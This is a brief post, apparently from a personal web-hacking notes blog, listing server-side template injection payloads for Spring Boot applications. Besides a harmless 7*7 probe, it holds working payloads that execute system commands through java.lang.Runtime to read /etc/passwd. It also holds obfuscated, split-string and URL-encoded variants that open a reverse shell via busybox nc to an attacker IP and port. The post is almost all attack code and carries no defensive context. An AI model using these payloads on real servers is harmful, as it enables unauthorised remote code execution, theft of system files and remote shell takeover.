---
title: ssti
author: janger
date: 2023-09-25
category: Web Hacking
layout: post
---

<h1>SSTI(Server Side Template Injection)</h1>

<br>

**Spring Boot SSTI vulnerability**

```
__${7*7}__::.x

${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

__${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}__::.x

__${(1).TYPE.forName('ja' 'va.lang.Runt' 'ime').getMethods()[6].invoke((1).TYPE.forName('ja' 'va.lang.Runt' 'ime')).exec('busybox nc (Attacker_IP) (Attacker_PORT) -e /bin/sh')}__::.x

__${(1).TYPE.forName('ja'+'va.lang.Runt'+'ime').getMethods()[6].invoke((1).TYPE.forName('ja'+'va.lang.Runt'+'ime')).exec('busybox%20nc%20(Attacker_IP)%20(Attacker_PORT)%20-e%20%2Fbin%2Fsh')}__::.x
```

<br>
